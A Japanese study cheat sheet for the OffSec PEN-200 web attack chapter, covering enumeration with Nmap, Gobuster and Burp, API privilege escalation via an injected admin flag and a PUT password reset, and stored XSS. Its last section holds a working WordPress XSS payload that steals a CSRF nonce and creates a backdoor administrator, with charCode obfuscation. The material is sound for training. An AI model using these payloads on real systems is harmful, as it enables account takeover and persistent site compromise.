# OffSec PEN-200 Webアプリケーション診断 チートシート (日本語版)

PEN-200 第8章「Webアプリケーション攻撃入門」に基づく、実技ラボ・学習用のWebアプリケーションセキュリティ検証リファレンスです。

---

## 1. Webアプリケーション評価手法

セキュリティ評価における情報開示レベルとテスト手法の分類です。

| 手法 | 情報レベル | アクセス範囲 | 主な検証内容 | 代表例 |
| :--- | :--- | :--- | :--- | :--- |
| **ブラックボックステスト** | 事前情報なし | 内部資料・認証情報の提供なし | 外部からの情報収集および網羅的な列挙 | 外部診断、バグバウンティ、実技演習 |
| **グレーボックステスト** | 一部情報あり | 特定の認証情報や設計情報を提供 | 権限分離の確認や認証後機能のロジック検証 | 一般的な商用セキュリティ診断 |
| **ホワイトボックステスト** | 完全な情報あり | ソースコードやインフラ設計書を提供 | ソースコード診断、詳細な構成監査 | 包括的なコードレビュー、出荷前検査 |

---

## 2. 偵察とインフラストラクチャの調査

### Nmap によるサービス調査

稼働しているHTTPサービスとバージョンを特定します。

```bash
# ポート80のサービスバージョン検出
sudo nmap -p80 -sV <TARGET_IP>

# http-enum スクリプトによる公開パスの探索
sudo nmap -p80 --script=http-enum <TARGET_IP>
```

### 技術スタックの受動的調査

*   **Wappalyzer**: ブラウザ拡張機能等を用いて、Webサーバー、OS、フレームワーク、JavaScriptライブラリ（jQuery等）を特定。
*   **HTTPレスポンスヘッダー**:
    *   `Server`: Webサーバーソフトウェア（例: Apache, Werkzeug等）。
    *   `X-Powered-By`: サーバーサイドのフレームワークや言語（例: PHP, ASP.NET）。
    *   `X-Forwarded-For`: リバースプロキシを経由したクライアントIPの転送記録。

### クローラー設定ファイル (robots.txt)

```bash
curl -i http://<TARGET_IP>/robots.txt
```
`Disallow` 項目に記載された非公開ディレクトリや管理用パスを確認します。

---

## 3. Gobuster によるディレクトリ・APIエンドポイント探索

### 基本的なディレクトリスキャン

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -t 5
```

*   `200 OK`: リソースが存在しアクセス可能。
*   `301/302`: リダイレクト。末尾スラッシュの補正等を検証。
*   `403 Forbidden`: 存在は確認できるがアクセス制限中。

### パターンファイルを用いた API エンドポイント探索

1.  パターンファイル `pattern` を作成:
    ```text
    {GOBUSTER}/v1
    {GOBUSTER}/v2
    ```
2.  `-p` オプションを指定して実行:
    ```bash
    gobuster dir -u http://<TARGET_IP>:<PORT> -w /usr/share/wordlists/dirb/big.txt -p pattern
    ```
3.  検出されたエンドポイントのサブパスをスキャン:
    ```bash
    gobuster dir -u http://<TARGET_IP>:<PORT>/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
    ```

---

## 4. Burp Suite の基本操作と連携

### 初期セットアップ
1.  **プロキシリスナー**: `127.0.0.1:8080` が起動していることを確認。
2.  **Firefox設定**: ネットワーク設定で手動プロキシ（`127.0.0.1:8080`）を指定。
3.  **キャプティブポータル無効化**: Firefoxの `about:config` で `network.captive-portal-service.enabled` を `false` に設定。
4.  **ホスト名の解決**: 必要に応じて `/etc/hosts` にIPとホスト名を登録。

### 主要機能の用途
*   **Proxy**: 通信内容の傍受・確認（`HTTP history`）。
*   **Repeater**: リクエストを編集して再送・検証。
*   **Intruder**: パスワードなどの総当たりテストの自動化。

---

## 5. REST API の検証と権限設定の不備

### API メソッドの確認
*   `405 Method Not Allowed`: GET 以外のメソッド（POST, PUT等）が許可されている可能性を示唆。

### パラメータ検証の不備（管理者属性の付与検証）
ユーザー登録APIにおいて、管理者権限フラグを受け付ける構成になっていないかを検証します。

```bash
curl -i -d '{"username":"offsec","password":"lab","email":"pwn@offsec.com","admin":"True"}' \
  -H 'Content-Type: application/json' \
  http://<TARGET_IP>:<PORT>/users/v1/register
```

登録後、トークンを取得:
```bash
curl -i -d '{"username":"offsec","password":"lab"}' \
  -H 'Content-Type: application/json' \
  http://<TARGET_IP>:<PORT>/users/v1/login
```

### PUT メソッドによるパスワード更新の検証
```bash
curl -X 'PUT' 'http://<TARGET_IP>:<PORT>/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth <JWT_TOKEN>' \
  -d '{"password": "pwned"}' \
  --proxy 127.0.0.1:8080
```

---

## 6. クロスサイトスクリプティング (XSS)

### 分類
*   **格納型 (Stored XSS)**: 入力値がデータベース等に保存され、閲覧時に実行される。
*   **反射型 (Reflected XSS)**: リクエストパラメータがそのままレスポンスに反映されて実行される。
*   **DOMベース XSS**: クライアントサイドのJavaScript内で完結して実行される。

### 特殊文字の検証
`< > ' " { } ;` を入力し、HTMLエスケープやURLエンコードの有無を確認します。

### Cookie の保護設定
*   `HttpOnly`: JavaScriptからのCookie読み取りを禁止。
*   `Secure`: HTTPS通信時のみ送信を許可。

---

## 7. 格納型 XSS と CSRF トークン連携の検証

ログ記録プラグイン等でUser-Agentヘッダーが適切にエスケープされずDBに保存される場合の検証手法です。

### 基本的な PoC
```bash
curl -i http://<TARGET_IP>/ --user-agent "<script>alert(42)</script>"
```

### CSRF トークンを動的取得して処理を実行するスクリプト例
```javascript
// 1. 管理画面から CSRF nonce を取得
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

// 2. 取得した nonce を含めてリクエストを作成・送信
var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

### 文字コード変換によるペイロード送信
```javascript
function encode_to_javascript(string) {
    var input = string;
    var output = '';
    for(var pos = 0; pos < input.length; pos++) {
        output += input.charCodeAt(pos);
        if(pos != (input.length - 1)) {
            output += ",";
        }
    }
    return output;
}
```

変換した数値列を用いて送信:
```bash
curl -i http://<TARGET_IP>/ \
  --user-agent "<script>eval(String.fromCharCode(<コンマ区切りの数値列>))</script>" \
  --proxy 127.0.0.1:8080
```
